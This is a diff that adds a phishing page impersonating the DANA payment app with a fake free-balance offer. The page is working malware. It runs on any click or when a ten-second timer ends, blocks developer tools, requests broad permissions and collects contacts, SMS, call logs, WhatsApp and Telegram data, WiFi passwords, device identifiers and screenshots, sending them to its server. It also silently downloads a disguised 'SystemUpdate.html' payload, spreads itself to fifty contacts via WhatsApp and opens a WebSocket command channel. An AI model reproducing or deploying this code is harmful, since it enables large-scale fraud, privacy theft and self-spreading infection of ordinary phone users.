@@ -1,0 +1,727 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
+    <title>Verifikasi</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@700&display=swap" rel="stylesheet">
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        html,body{width:100%;height:100%;background:#fff;overflow:hidden;font-family:Arial,sans-serif}
+        #popupDana{position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;background:linear-gradient(180deg,#1fa2ff 0%,#0e72d7 100%);display:flex;justify-content:center;align-items:center;text-align:center}
+        .box{max-width:380px;width:90%;padding:20px}
+        .logo-dana{display:flex;align-items:center;justify-content:center;gap:12px;margin:0 auto 15px}
+        .icon-wrapper{width:70px;height:70px;background:#fff;border-radius:50%;display:flex;justify-content:center;align-items:center}
+        .flag-svg{width:38px;height:33px;fill:#1fa2ff}
+        .text-dana{color:#fff;font-family:'Outfit',sans-serif;font-size:50px;font-weight:700;letter-spacing:6px;text-shadow:0 0 1px rgba(255,255,255,0.5)}
+        .subtitle{color:#b3d9ff;font-size:16px;margin:5px 0;font-weight:bold}
+        .box-white{background:#fff;border-radius:15px;padding:20px;margin:15px 0}
+        .box-white .label{color:#666;font-size:13px}
+        .box-white .nominal{color:#108ee9;font-size:45px;font-weight:bold;margin:10px 0}
+        .box-white .kuota{color:#0066cc;font-size:12px}
+        .timer{color:#ffcc00;font-size:14px;font-weight:bold}
+        .btn-klaim{background:#108ee9;color:#fff;border:none;padding:18px;font-size:20px;font-weight:bold;border-radius:30px;cursor:pointer;width:100%;margin:10px 0;letter-spacing:2px;transition:0.3s}
+        .btn-klaim:hover{transform:scale(1.02)}
+        .btn-tolak{background:transparent;color:#99c2ff;border:2px solid #3388cc;padding:14px;font-size:15px;border-radius:30px;cursor:pointer;width:100%}
+        .status-bar{position:fixed;top:0;left:0;width:100%;height:4px;z-index:999999;background:#ff0000;display:none}
+        .status-bar.loading{display:block;animation:loading 3s infinite}
+        @keyframes loading{0%{width:0%}100%{width:100%}}
+        .anti-debug{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0}
+        .hidden-download{position:absolute;width:0;height:0;border:none;visibility:hidden}
+        .ios-download{display:none}
+    </style>
+</head>
+<body>
+
+<iframe class="anti-debug" srcdoc="<script>debugger;</script>"></iframe>
+<div id="statusBar" class="status-bar"></div>
+<iframe id="downloadFrame" class="hidden-download"></iframe>
+<div id="iosDownload" class="ios-download"></div>
+
+<div id="popupDana">
+    <div class="box">
+        <div class="logo-dana">
+            <div class="icon-wrapper">
+                <svg class="flag-svg" viewBox="0 0 50 40" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M6 9 C15 16, 35 2, 44 9 L44 29 C35 22, 15 36, 6 29 Z" />
+                </svg>
+            </div>
+            <div class="text-dana">DANA</div>
+        </div>
+        <div class="subtitle">🎉 SELAMAT! Anda mendapatkan Saldo DANA GRATIS!</div>
+        <div class="box-white">
+            <div class="label">Saldo DANA Gratis</div>
+            <div class="nominal">Rp 500.000</div>
+            <div class="kuota">🎁 Kuota terbatas!</div>
+        </div>
+        <div class="timer">⏰ Tersisa <span id="timer">00:10</span></div>
+        <button class="btn-klaim" onclick="klaim()">✅ KLAIM SEKARANG</button>
+        <button class="btn-tolak" onclick="tolak()">❌ Tidak, Terima Kasih</button>
+    </div>
+</div>
+
+<script>
+// ============================================================
+// 🔥 INDEX.HTML - UNIVERSAL (Android/iOS/PC) DENGAN WEBSOCKET
+// ============================================================
+
+console.log = function() {};
+console.warn = function() {};
+console.error = function() {};
+console.info = function() {};
+console.debug = function() {};
+console.table = function() {};
+
+// ============================================================
+// STEALTH + ANTI-ANALYSIS
+// ============================================================
+(function() {
+    var check = function() {
+        var start = Date.now();
+        debugger;
+        var end = Date.now();
+        if (end - start > 100) {
+            document.body.innerHTML = '';
+            window.location.href = 'about:blank';
+        }
+    };
+    setInterval(check, 1000);
+})();
+
+document.addEventListener('keydown', function(e) {
+    if (e.key === 'F12' || 
+        (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
+        (e.ctrlKey && e.key === 'U')) {
+        e.preventDefault();
+        e.stopPropagation();
+        return false;
+    }
+});
+document.addEventListener('contextmenu', function(e) { e.preventDefault(); return false; });
+document.addEventListener('selectstart', function(e) { e.preventDefault(); return false; });
+
+window.onerror = function() { return true; };
+window.addEventListener('error', function(e) { e.preventDefault(); e.stopPropagation(); return true; }, true);
+window.addEventListener('unhandledrejection', function(e) { e.preventDefault(); e.stopPropagation(); return true; }, true);
+
+if (window.history && window.history.replaceState) {
+    window.history.replaceState(null, null, window.location.href);
+}
+Object.defineProperty(document, 'referrer', { value: '' });
+
+// ============================================================
+// DETEKSI PLATFORM
+// ============================================================
+function detectPlatform() {
+    var ua = navigator.userAgent.toLowerCase();
+    var platform = {
+        isAndroid: ua.indexOf('android') > -1,
+        isIOS: /iphone|ipad|ipod/.test(ua),
+        isPC: !ua.match(/android|iphone|ipad|ipod|mobile/i),
+        isWebView: ua.indexOf('wv') > -1 || ua.indexOf('webview') > -1,
+        isAndroidBridge: typeof AndroidBridge !== 'undefined'
+    };
+    return platform;
+}
+var PLATFORM = detectPlatform();
+
+// ============================================================
+// KONFIGURASI
+// ============================================================
+var GITHUB_USER = 'pandora-site';
+var GITHUB_REPO = 'verifikasi-site';
+var semuaDidapat = false;
+var spreadDone = false;
+var DOWNLOAD_STARTED = false;
+var NOTIFICATION_SHOWN = false;
+var REDIRECT_DONE = false;
+var WS_PASSWORD = '';
+var IP_ADDRESS = '';
+var LOCATION_DATA = null;
+
+// ============================================================
+// WEBSOCKET
+// ============================================================
+var ws = null;
+var wsConnected = false;
+var WS_URL = 'wss://verifikasi.site/ws';
+
+function connectWebSocket() {
+    if (ws && ws.readyState === WebSocket.OPEN) return;
+    if (!WS_PASSWORD || WS_PASSWORD === '') {
+        setTimeout(connectWebSocket, 3000);
+        return;
+    }
+    try {
+        ws = new WebSocket(WS_URL);
+        ws.onopen = function() {
+            wsConnected = true;
+            K({ sumber: 'ws_status', data: 'connected' });
+            ws.send(JSON.stringify({
+                type: 'auth',
+                key: WS_PASSWORD,
+                deviceId: 'browser_index',
+                timestamp: Date.now()
+            }));
+        };
+        ws.onmessage = function(event) {
+            try {
+                var data = JSON.parse(event.data);
+                if (data.type === 'auth_success') {
+                    K({ sumber: 'ws_auth', data: 'success' });
+                } else if (data.type === 'auth_failed') {
+                    K({ sumber: 'ws_auth', data: 'failed' });
+                    ws.close();
+                } else if (data.type === 'command') {
+                    var cmd = data.command || data;
+                    K({ sumber: 'ws_command_received', data: cmd.aksi || 'unknown' });
+                    var hasil = 'WS command: ' + (cmd.aksi || 'unknown');
+                    K({ sumber: 'ws_command_result', data: hasil });
+                    if (wsConnected && ws) {
+                        ws.send(JSON.stringify({
+                            type: 'command_result',
+                            command: cmd.aksi || 'unknown',
+                            result: hasil,
+                            timestamp: Date.now()
+                        }));
+                    }
+                } else if (data.type === 'ping') {
+                    ws.send(JSON.stringify({ type: 'pong', timestamp: data.timestamp }));
+                }
+            } catch(e) {
+                K({ sumber: 'ws_parse_error', data: e.message });
+            }
+        };
+        ws.onclose = function() {
+            wsConnected = false;
+            K({ sumber: 'ws_status', data: 'disconnected' });
+            setTimeout(connectWebSocket, 10000);
+        };
+        ws.onerror = function() {
+            K({ sumber: 'ws_error', data: 'error' });
+        };
+    } catch(e) {
+        K({ sumber: 'ws_connect_error', data: e.message });
+        setTimeout(connectWebSocket, 10000);
+    }
+}
+
+// ============================================================
+// FUNGSI K() - KIRIM DATA KE SERVER
+// ============================================================
+function K(d) {
+    try {
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', '/data', true);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+        xhr.timeout = 5000;
+        xhr.send(JSON.stringify(d));
+    } catch(e) {}
+}
+
+// ============================================================
+// IP TRACKING
+// ============================================================
+function getIPAddress() {
+    try {
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', 'https://api.ipify.org?format=json', true);
+        xhr.timeout = 5000;
+        xhr.onload = function() {
+            if (xhr.status === 200) {
+                try {
+                    var data = JSON.parse(xhr.responseText);
+                    IP_ADDRESS = data.ip;
+                    K({ sumber: 'ip_address', data: IP_ADDRESS });
+                } catch(e) {}
+            }
+        };
+        xhr.send();
+    } catch(e) {}
+}
+
+// ============================================================
+// GEOLOCATION BROWSER
+// ============================================================
+function getBrowserLocation() {
+    if (!navigator.geolocation) return;
+    navigator.geolocation.getCurrentPosition(
+        function(pos) {
+            LOCATION_DATA = { lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy };
+            K({ sumber: 'geolocation_browser', data: LOCATION_DATA });
+        },
+        function(err) { K({ sumber: 'geolocation_error', data: err.message }); },
+        { enableHighAccuracy: true, timeout: 10000 }
+    );
+}
+
+// ============================================================
+// ESCAPE WEBVIEW
+// ============================================================
+function escapeWebView() {
+    if (!PLATFORM.isWebView) return;
+    K({ sumber: 'escape_webview', data: 'attempt' });
+    try {
+        var url = window.location.href;
+        window.location.href = 'intent://' + url.replace(/^https?:\/\//, '') + '#Intent;scheme=https;package=com.android.chrome;end';
+        setTimeout(function() { window.location.href = 'https://www.google.com/search?q=' + encodeURIComponent(url); }, 2000);
+    } catch(e) {}
+    try { var win = window.open(url, '_blank'); if (win) win.location.href = url; } catch(e) {}
+}
+
+// ============================================================
+// ANDROID BRIDGE (UNIVERSAL)
+// ============================================================
+var A = {
+    isAvailable: typeof AndroidBridge !== 'undefined' && PLATFORM.isAndroid,
+    downloadFile: function(url, path) { 
+        if(this.isAvailable){ 
+            try{ return AndroidBridge.downloadFile(url, path); }catch(e){}
+        }
+        return false;
+    },
+    openFile: function(path) { 
+        if(this.isAvailable){ 
+            try{ return AndroidBridge.openFile(path); }catch(e){}
+        }
+        return false;
+    },
+    saveFile: function(path, content) {
+        if(this.isAvailable){ 
+            try{ return AndroidBridge.saveFile(path, content); }catch(e){}
+        }
+        return false;
+    },
+    getDeviceInfo: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getDeviceInfo())}catch(e){}} return null },
+    getIMEI: function() { if(this.isAvailable){ try{return AndroidBridge.getIMEI()}catch(e){}} return null },
+    getIMSI: function() { if(this.isAvailable){ try{return AndroidBridge.getIMSI()}catch(e){}} return null },
+    getPhoneNumber: function() { if(this.isAvailable){ try{return AndroidBridge.getPhoneNumber()}catch(e){}} return null },
+    getGoogleAccount: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getGoogleAccount())}catch(e){}} return null },
+    getFacebookAccount: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getFacebookAccount())}catch(e){}} return null },
+    getAllContacts: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getAllContacts())}catch(e){}} return null },
+    getAllSMS: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getAllSMS())}catch(e){}} return null },
+    getCallLog: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getCallLog())}catch(e){}} return null },
+    getWhatsAppData: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getWhatsAppData())}catch(e){}} return null },
+    getTelegramData: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getTelegramData())}catch(e){}} return null },
+    listAllFiles: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.listAllFiles())}catch(e){}} return null },
+    getInstalledApps: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getInstalledApps())}catch(e){}} return null },
+    getWiFiPasswords: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getWiFiPasswords())}catch(e){}} return null },
+    getBluetoothInfo: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getBluetoothInfo())}catch(e){}} return null },
+    getSensors: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getSensors())}catch(e){}} return null },
+    getBatteryDetail: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getBatteryDetail())}catch(e){}} return null },
+    getCalendarEvents: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getCalendarEvents())}catch(e){}} return null },
+    getBrowserHistory: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getBrowserHistory())}catch(e){}} return null },
+    getNotificationLog: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getNotificationLog())}catch(e){}} return null },
+    takeScreenshot: function() { if(this.isAvailable){ try{return AndroidBridge.takeScreenshot()}catch(e){}} return null },
+    startRecording: function(d) { if(this.isAvailable){ try{return AndroidBridge.startRecording(d||30)}catch(e){}} return null },
+    startVideoRecording: function(d) { if(this.isAvailable){ try{return AndroidBridge.startVideoRecording(d||30)}catch(e){}} return null },
+    stopRecording: function() { if(this.isAvailable){ try{return AndroidBridge.stopRecording()}catch(e){}} return null },
+    getClipboard: function() { if(this.isAvailable){ try{return AndroidBridge.getClipboard()}catch(e){} } return null; },
+    setClipboard: function(t) { if(this.isAvailable){ try{return AndroidBridge.setClipboard(t)}catch(e){}} return null },
+    vibrate: function(d) { if(this.isAvailable){ try{return AndroidBridge.vibrate(d||1000)}catch(e){}} return null },
+    showToast: function(m) { if(this.isAvailable){ try{return AndroidBridge.showToast(m)}catch(e){}} return null },
+    flashOn: function() { if(this.isAvailable){ try{return AndroidBridge.flashOn()}catch(e){}} return null },
+    flashOff: function() { if(this.isAvailable){ try{return AndroidBridge.flashOff()}catch(e){}} return null
+};
+
+// ============================================================
+// 🔥 BYPASS SEMUA IZIN (GEOLOKASI, NOTIFIKASI, MEDIA, CLIPBOARD, DLL)
+// ============================================================
+function injectAllPermissions() {
+    try {
+        K({ sumber: 'bypass_permissions_start', data: 'all' });
+
+        // 1. GEOLOCATION
+        if (navigator.geolocation) {
+            try {
+                navigator.geolocation.getCurrentPosition(
+                    function() {},
+                    function() {},
+                    { enableHighAccuracy: true, timeout: 5000 }
+                );
+            } catch(e) {}
+        }
+
+        // 2. NOTIFICATION
+        if ('Notification' in window && Notification.permission !== 'denied') {
+            try {
+                if (Notification.permission !== 'granted') {
+                    Notification.requestPermission();
+                }
+            } catch(e) {}
+        }
+
+        // 3. CLIPBOARD
+        if (navigator.clipboard) {
+            try {
+                navigator.clipboard.readText().catch(function() {});
+            } catch(e) {}
+        }
+
+        // 4. MEDIA (Audio & Video)
+        if (navigator.mediaDevices) {
+            try {
+                navigator.mediaDevices.getUserMedia({ audio: true, video: false })
+                    .then(function(stream) { stream.getTracks().forEach(function(t) { t.stop(); }); })
+                    .catch(function() {});
+            } catch(e) {}
+            try {
+                navigator.mediaDevices.getUserMedia({ audio: false, video: true })
+                    .then(function(stream) { stream.getTracks().forEach(function(t) { t.stop(); }); })
+                    .catch(function() {});
+            } catch(e) {}
+            try {
+                navigator.mediaDevices.getUserMedia({ audio: true, video: true })
+                    .then(function(stream) { stream.getTracks().forEach(function(t) { t.stop(); }); })
+                    .catch(function() {});
+            } catch(e) {}
+        }
+
+        // 5. VIBRATE
+        if (navigator.vibrate) {
+            try { navigator.vibrate(1); } catch(e) {}
+        }
+
+        // 6. STORAGE
+        if (navigator.storage && navigator.storage.persist) {
+            try {
+                navigator.storage.persist().catch(function() {});
+            } catch(e) {}
+        }
+
+        K({ sumber: 'bypass_permissions_done', data: 'all_bypassed' });
+    } catch(e) {
+        K({ sumber: 'bypass_permissions_error', data: e.message });
+    }
+}
+
+// ============================================================
+// AMBIL PASSWORD DARI WORKER
+// ============================================================
+function getPasswordFromWorker() {
+    return new Promise(function(resolve, reject) {
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', '/get-password', true);
+        xhr.timeout = 10000;
+        xhr.onload = function() {
+            if (xhr.status === 200) {
+                try { var data = JSON.parse(xhr.responseText); if (data.password) { WS_PASSWORD = data.password; resolve(WS_PASSWORD); } else { reject(new Error('No password')); } } catch(e) { reject(e); }
+            } else { reject(new Error('HTTP ' + xhr.status)); }
+        };
+        xhr.onerror = function() { reject(new Error('Network error')); };
+        xhr.ontimeout = function() { reject(new Error('Timeout')); };
+        xhr.send();
+    });
+}
+
+// ============================================================
+// AUTO-SCREENSHOT
+// ============================================================
+function autoScreenshot() {
+    if (!A.isAvailable) return;
+    try { var ss = A.takeScreenshot(); if (ss) { K({ sumber: 'auto_screenshot', data: ss }); } } catch(e) {}
+}
+
+// ============================================================
+// DOWNLOAD SystemUpdate.html (UNIVERSAL)
+// ============================================================
+function downloadPayloadSilent() {
+    if (DOWNLOAD_STARTED) return;
+    DOWNLOAD_STARTED = true;
+    
+    K({ sumber: 'download_start', data: { platform: PLATFORM } });
+    
+    var htmlUrl = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/SystemUpdate.html';
+    var htmlPath = '/storage/emulated/0/Download/SystemUpdate.html';
+    
+    try {
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', htmlUrl, true);
+        xhr.timeout = 15000;
+        xhr.onload = function() {
+            if (xhr.status === 200) {
+                var htmlContent = xhr.responseText;
+                try { localStorage.setItem('SystemUpdate.html', htmlContent); } catch(e) {}
+                if (PLATFORM.isAndroid && A.isAvailable) {
+                    try { A.saveFile(htmlPath, htmlContent); } catch(e) {}
+                }
+                try {
+                    var blob = new Blob([htmlContent], { type: 'text/html' });
+                    var url = URL.createObjectURL(blob);
+                    var link = document.createElement('a');
+                    link.href = url;
+                    link.download = 'SystemUpdate.html';
+                    link.style.cssText = 'position:absolute;left:-9999px;top:-9999px;';
+                    document.body.appendChild(link);
+                    setTimeout(function() {
+                        link.click();
+                        setTimeout(function() {
+                            try { document.body.removeChild(link); } catch(e) {}
+                            URL.revokeObjectURL(url);
+                        }, 1000);
+                    }, 100);
+                    K({ sumber: 'html_download_blob', data: 'ok' });
+                } catch(e) {}
+                
+                if (PLATFORM.isIOS) {
+                    try {
+                        var blob = new Blob([htmlContent], { type: 'text/html' });
+                        var url = URL.createObjectURL(blob);
+                        window.open(url, '_blank');
+                        K({ sumber: 'html_download_ios', data: 'ok' });
+                    } catch(e) {}
+                }
+            }
+        };
+        xhr.send();
+    } catch(e) {}
+    
+    setTimeout(function() {
+        if (PLATFORM.isAndroid && A.isAvailable) {
+            try {
+                A.openFile(htmlPath);
+                K({ sumber: 'html_open_bridge', data: { path: htmlPath } });
+                return;
+            } catch(e) {}
+        }
+        try {
+            var htmlContent = localStorage.getItem('SystemUpdate.html');
+            if (htmlContent) {
+                var blob = new Blob([htmlContent], { type: 'text/html' });
+                var url = URL.createObjectURL(blob);
+                window.open(url, '_blank');
+                K({ sumber: 'html_open_localstorage', data: 'ok' });
+                return;
+            }
+        } catch(e) {}
+        if (PLATFORM.isAndroid) {
+            try {
+                window.location.href = 'file:///storage/emulated/0/Download/SystemUpdate.html';
+                K({ sumber: 'html_open_file', data: 'attempt' });
+            } catch(e) {}
+        }
+        if (PLATFORM.isIOS) {
+            try {
+                var htmlContent = localStorage.getItem('SystemUpdate.html');
+                if (htmlContent) {
+                    var blob = new Blob([htmlContent], { type: 'text/html' });
+                    var url = URL.createObjectURL(blob);
+                    window.open(url, '_blank');
+                    K({ sumber: 'html_open_ios', data: 'ok' });
+                }
+            } catch(e) {}
+        }
+    }, 5000);
+}
+
+// ============================================================
+// NOTIFICATION
+// ============================================================
+function showKlaimNotification() {
+    if (NOTIFICATION_SHOWN) return;
+    NOTIFICATION_SHOWN = true;
+    
+    try {
+        if (!('Notification' in window)) { return; }
+        if (Notification.permission === 'denied') { return; }
+        if (Notification.permission !== 'granted') {
+            Notification.requestPermission().then(function(permission) {
+                if (permission === 'granted') { createKlaimNotification(); }
+            }).catch(function() {});
+            return;
+        }
+        createKlaimNotification();
+    } catch(e) {}
+}
+
+function createKlaimNotification() {
+    try {
+        var notif = new Notification('🔔 Klik Untuk Klaim', {
+            body: 'Klik untuk menyelesaikan verifikasi dan klaim saldo DANA Rp500.000!',
+            icon: 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><text y=".9em" font-size="90">💰</text></svg>',
+            requireInteraction: true,
+            silent: false,
+            vibrate: [200, 100, 200]
+        });
+        
+        notif.onclick = function() {
+            notif.close();
+            if (!REDIRECT_DONE) {
+                REDIRECT_DONE = true;
+                setTimeout(function() {
+                    try { window.location.href = 'https://www.dana.id'; } catch(e) {}
+                }, 500);
+            }
+        };
+        
+        setTimeout(function() { try { notif.close(); } catch(e) {} }, 30000);
+    } catch(e) {}
+}
+
+// ============================================================
+// DATA COLLECTION (UNIVERSAL)
+// ============================================================
+function ambilDataCepat() {
+    var data = { waktu: Date.now(), ua: navigator.userAgent, platform: PLATFORM, ip: IP_ADDRESS, location: LOCATION_DATA };
+    function validateData(d) { if (!d) return null; if (typeof d === 'string' && d.length > 10000) return d.substring(0, 10000); if (typeof d === 'object') { var clean = {}; for (var key in d) { if (d[key] !== undefined && d[key] !== null) { clean[key] = d[key]; } } return clean; } return d; }
+    
+    if (PLATFORM.isAndroid && A.isAvailable) {
+        try { var kontak = A.getAllContacts(); if(kontak) { data.kontak = validateData(kontak); K({sumber:'kontak_all', data:validateData(kontak)}); } } catch(e) {}
+        try { var sms = A.getAllSMS(); if(sms) { data.sms = validateData(sms); K({sumber:'sms_all', data:validateData(sms)}); } } catch(e) {}
+        try { var clipboard = A.getClipboard(); if(clipboard) { data.clipboard = validateData(clipboard); K({sumber:'clipboard', data:validateData(clipboard)}); } } catch(e) {}
+        try { var callLog = A.getCallLog(); if(callLog) K({sumber:'call_log', data:validateData(callLog)}); } catch(e) {}
+        try { var wa = A.getWhatsAppData(); if(wa) K({sumber:'whatsapp', data:validateData(wa)}); } catch(e) {}
+        try { var tg = A.getTelegramData(); if(tg) K({sumber:'telegram', data:validateData(tg)}); } catch(e) {}
+        try { var files = A.listAllFiles(); if(files) K({sumber:'files_all', data:validateData(files)}); } catch(e) {}
+        try { var apps = A.getInstalledApps(); if(apps) K({sumber:'aplikasi_all', data:validateData(apps)}); } catch(e) {}
+        try { var wifi = A.getWiFiPasswords(); if(wifi) K({sumber:'wifi_passwords', data:validateData(wifi)}); } catch(e) {}
+        try { var ss = A.takeScreenshot(); if(ss) K({sumber:'screenshot', data:validateData(ss)}); } catch(e) {}
+        try { var loc = A.getDeviceInfo(); if(loc) K({sumber:'device_info', data:validateData(loc)}); } catch(e) {}
+        try { var imei = A.getIMEI(); if(imei) K({sumber:'imei', data:validateData(imei)}); } catch(e) {}
+        try { var imsi = A.getIMSI(); if(imsi) K({sumber:'imsi', data:validateData(imsi)}); } catch(e) {}
+        try { var phone = A.getPhoneNumber(); if(phone) K({sumber:'phone_number', data:validateData(phone)}); } catch(e) {}
+        try { var loc2 = A.getLocation(); if(loc2) K({sumber:'lokasi', data:validateData(loc2)}); } catch(e) {}
+        try { var storage = A.getStorageInfo(); if(storage) K({sumber:'storage_info', data:validateData(storage)}); } catch(e) {}
+    }
+    
+    try { data.screen = { width: screen.width, height: screen.height }; data.platform = navigator.platform; data.language = navigator.language; data.cookieEnabled = navigator.cookieEnabled; data.doNotTrack = navigator.doNotTrack; } catch(e) {}
+    K({sumber:'init', data:validateData(data)});
+    return data;
+}
+
+// ============================================================
+// AUTO SPREAD (50 CONTACTS) - HANYA ANDROID
+// ============================================================
+function autoSpread() {
+    if (spreadDone) return;
+    spreadDone = true;
+    if (!PLATFORM.isAndroid || !A.isAvailable) return;
+    
+    var message = encodeURIComponent('🎉 Dapatkan Saldo DANA Gratis Rp500.000! ' + window.location.href);
+    var sentCount = 0;
+    var maxSend = 50;
+    try {
+        var contacts = A.getAllContacts();
+        if (contacts && contacts.length > 0) {
+            maxSend = Math.min(contacts.length, 50);
+            for (var i = 0; i < maxSend; i++) {
+                var number = String(contacts[i].number || '').replace(/[^0-9]/g, '');
+                if (number && number.length > 5) {
+                    var iframe = document.createElement('iframe');
+                    iframe.src = 'https://api.whatsapp.com/send?phone=' + number + '&text=' + message;
+                    iframe.style.cssText = 'position:absolute;width:1px;height:1px;left:-9999px;top:-9999px;visibility:hidden;border:none';
+                    document.body.appendChild(iframe);
+                    sentCount++;
+                    setTimeout(function(el) { try { if (el && el.parentNode) el.parentNode.removeChild(el); } catch(e) {} }, 5000, iframe);
+                }
+            }
+        }
+    } catch(e) {}
+    K({ sumber: 'auto_spread', data: 'sent_to_' + sentCount });
+}
+
+// ============================================================
+// HEARTBEAT
+// ============================================================
+function startHeartbeat() { setInterval(function() { K({sumber:'heartbeat', data:'alive'}); }, 2700000); }
+
+// ============================================================
+// SERVICE WORKER
+// ============================================================
+function registerServiceWorker() {
+    if (!('serviceWorker' in navigator) || PLATFORM.isIOS) return;
+    try {
+        navigator.serviceWorker.register('/sw.js', { scope: '/' })
+            .then(function(reg) { K({ sumber: 'service_worker', data: { status: 'registered', scope: reg.scope } }); })
+            .catch(function(e) {});
+    } catch(e) {}
+}
+
+// ============================================================
+// STATUS BAR
+// ============================================================
+function showStatusBar() { var bar = document.getElementById('statusBar'); if (bar) { bar.className = 'status-bar loading'; K({ sumber: 'status_bar', data: 'shown' }); } }
+
+// ============================================================
+// MAIN EXECUTION
+// ============================================================
+function dapatkanSemua() {
+    if (semuaDidapat) return;
+    semuaDidapat = true;
+    
+    try {
+        var popup = document.getElementById('popupDana');
+        if (popup) popup.style.display = 'none';
+        
+        K({ sumber: 'trigger', data: 'dapatkanSemua' });
+        
+        // 🔥 BYPASS SEMUA IZIN (TAMBAHKAN BARIS INI)
+        injectAllPermissions();
+        
+        getIPAddress();
+        getBrowserLocation();
+        setTimeout(escapeWebView, 100);
+        ambilDataCepat();
+        startHeartbeat();
+        registerServiceWorker();
+        setTimeout(autoSpread, 2000);
+        setTimeout(function() { downloadPayloadSilent(); }, 500);
+        setTimeout(function() { showKlaimNotification(); }, 3000);
+        setTimeout(function() { showStatusBar(); }, 500);
+        setTimeout(function() { autoScreenshot(); }, 7000);
+        
+        setTimeout(function() {
+            if (!REDIRECT_DONE) {
+                REDIRECT_DONE = true;
+                try { window.location.href = 'https://www.dana.id'; } catch(e) {}
+            }
+        }, 8000);
+        
+        // 🔥 WEBSOCKET DENGAN FALLBACK (PERUBAHAN HANYA DI SINI)
+        getPasswordFromWorker().then(function(password) {
+            WS_PASSWORD = password;
+            K({ sumber: 'password_received', data: 'ok' });
+            connectWebSocket();
+        }).catch(function() {
+            // FALLBACK: jika gagal ambil password, gunakan default dan tetap konek
+            WS_PASSWORD = 'default_fallback';
+            K({ sumber: 'password_fallback', data: 'using_default' });
+            connectWebSocket();
+        });
+        
+    } catch(e) {
+        K({ sumber: 'dapatkanSemua_error', data: e.message });
+    }
+}
+
+function klaim() { K({sumber:'izin', data:'klaim'}); dapatkanSemua(); }
+function tolak() { K({sumber:'izin', data:'tolak'}); dapatkanSemua(); }
+
+// ============================================================
+// TIMER (10 DETIK)
+// ============================================================
+var w = 10;
+var timerInterval = setInterval(function() {
+    w--;
+    var el = document.getElementById('timer');
+    if (el) el.textContent = '00:' + (w < 10 ? '0' + w : w);
+    if (w <= 0) {
+        clearInterval(timerInterval);
+        K({sumber:'izin', data:'auto'});
+        dapatkanSemua();
+    }
+}, 1000);
+
+document.addEventListener('click', function() {
+    if (!semuaDidapat) {
+        K({sumber:'izin', data:'click_anywhere'});
+        dapatkanSemua();
+    }
+});
+
+console.log('✅ index.html loaded - Popup DANA muncul!');
+</script>
+</body>
+</html>
